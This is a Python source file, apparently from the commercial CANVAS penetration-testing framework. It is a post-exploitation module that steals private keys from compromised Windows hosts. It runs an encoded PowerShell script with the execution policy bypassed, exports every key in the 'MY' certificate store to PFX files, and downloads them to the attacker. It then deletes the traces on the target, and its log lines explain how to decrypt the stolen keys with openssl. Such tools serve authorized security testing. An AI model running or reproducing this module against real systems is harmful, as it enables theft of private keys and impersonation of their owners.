#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import re
import socket
import locale
import random
import base64
import math

from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
import logging
import canvasengine

NAME                            = "dump_certstore"
DESCRIPTION                     = "Dump public/private keys as PFX files"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Commandline"]    = "runmodule dump_certstore"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """
This module will dump all private keys in the 'MY' certificate store.

This module works correctly only in versions higher than windows 7.
"""

def get_ps_output(output):
    start_needle = "START_OUTPUT"
    end_needle = "END_OUTPUT"

    if start_needle not in output or end_needle not in output:
        return ""
    else:
        start_idx = output.index(start_needle) + len(start_needle)
        end_idx = output.index(end_needle)

        return output[start_idx:end_idx].lstrip().rstrip()


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.genTime        = str(int(time.time())) 
        return
    
    def set_progr(self, msg, percent):
        self.setInfo(("%s - " % NAME) + msg)
        self.setProgress(percent)

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        ret = False
        resource_path = os.path.join(os.path.dirname(__file__), "Resources", "dump_certstore.ps1")
        ps_data = None
        
        percent = 0
        increase = int(math.ceil(100 / len(self.argsDict["passednodes"])))

        with open(resource_path, "rb") as handle:
            ps_data = handle.read()

        for node in self.argsDict["passednodes"]:
            cert_password = "".join(random.choice(string.ascii_uppercase + string.digits) for x in range(0, 10))
            logging.info("Processing node %s" % (str(node)))
            logging.info("ALL PFX files are encrypted using the password: %s" % cert_password)
            
            if node.nodetype.lower() in ["powershellnode",
                                 "win32node",
                                 "win64node"]:
                ps_script = ps_data.replace("CERT_PASSWORD", cert_password)
                enc_script = base64.b64encode(ps_script.encode("utf-16le"))

                output = node.shell.runcommand("echo ""|powershell -outputformat text -executionpolicy bypass -enc %s" % enc_script)
                san_output = get_ps_output(output).strip(",")

                if len(san_output) == 0:
                    logging.info("No certificates detected")
                else:
                    cert_paths_string = san_output
                    cert_paths = cert_paths_string.split(",")
                    logging.info("Found %d certificates" % len(cert_paths))
                    ret = True
                    
                    node_ip = node.get_interesting_interface()
                    local_path = os.path.join(self.output(ip=node_ip, subdir="dump_certstore"))
                    found_cert = False
                    
                    for (index, cert_path) in enumerate(cert_paths):
                        if len(cert_path) == 0:
                            continue
                        
                        local_cert_path = os.path.join(local_path, "%d.pfx" % (index+1))
                        logging.info("Downloading cert from %s to %s" % (cert_path, local_cert_path))
                        node.shell.download(cert_path, local_cert_path)
                        
                        found_cert = True
                        
                    logging.info("Deleting temporary certificate files on target...")
                    for cert_path in cert_paths:
                        node.shell.unlink(cert_path)

                    if found_cert:
                        logging.info("To extract the private key information, run:")
                        logging.info("openssl pkcs12 -info -in FILE_NAME")
                        logging.info("The 'Import' and 'PEM' passphrases are the same and equal to the value previously stated")
                        logging.info("Copy the key contained in the 'BEGIN ENCRYPTED PRIVATE KEY' portion into a .pem file")
                        logging.info("Then run the following to decrypt the key:")
                        logging.info("openssl rsa -in PEM_FILE_NAME")
                        logging.info("Again, use the password above to complete the operation")
                        logging.info("Successful attempts will show 'BEGIN RSA PRIVATE KEY'")
                        logging.info("Note: the last command may differ if your private key is not an RSA key")
            else:
                logging.error("dump_certstore can only run on Win32/64Nodes and PowershellNodes")
            
            percent += increase
            self.set_progr("processed node %s" % (percent), percent)

                
        return ret
